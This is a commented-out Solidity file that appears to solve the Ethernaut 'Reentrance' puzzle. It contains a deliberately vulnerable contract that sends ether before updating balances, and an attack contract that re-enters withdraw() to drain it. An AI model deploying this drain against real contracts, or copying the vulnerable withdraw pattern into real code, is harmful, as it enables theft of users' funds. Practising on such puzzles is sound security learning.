// // SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import "openzeppelin-contracts-06/math/SafeMath.sol";

// contract Reentrance {
//     using SafeMath for uint256;
//     mapping(address => uint) public balances;

//     function donate(address _to) public payable {
//         balances[_to] = balances[_to].add(msg.value);
//     }

//     function balanceOf(address _who) public view returns (uint balance) {
//         return balances[_who];
//     }

//     function withdraw(uint _amount) public {
//         if (balances[msg.sender] >= _amount) {
//             (bool result, ) = msg.sender.call{ value: _amount }("");
//             if (result) {
//                 _amount;
//             }
//             balances[msg.sender] -= _amount;
//         }
//     }

//     receive() external payable {}
// }

// interface IReentrance {
//     function donate(address _to) external payable;

//     function withdraw(uint _amount) external;
// }

// contract ReentranceAttack {
//     address public owner;
//     IReentrance targetContract;
//     uint targetValue = 1000000000000000;

//     constructor(address _targetAddress) public {
//         targetContract = Reentrance(_targetAddress);
//         owner = msg.sender;
//     }

//     function balance() public returns (uint) {
//         return address(this).balance;
//     }

//     function donateAndWithdraw() public payable {
//         require(msg.value >= targetValue);
//         targetContract.donate.value(msg.value)(address(this));
//         targetContract.withdraw(msg.value);
//     }

//     function withdrawAll() public returns (bool) {
//         require(msg.sender == owner, "my money!!");
//         uint totalBalance = address(this).balance;
//         (bool sent, ) = msg.sender.call{ value: totalBalance }("");
//         require(sent, "failed to send ether");
//         return sent;
//     }

//     receive() external payable {
//         uint targetBalance = address(targetContract).balance;
//         if (targetBalance >= targetValue) {
//             targetContract.withdraw(targetValue);
//         }
//     }
// }
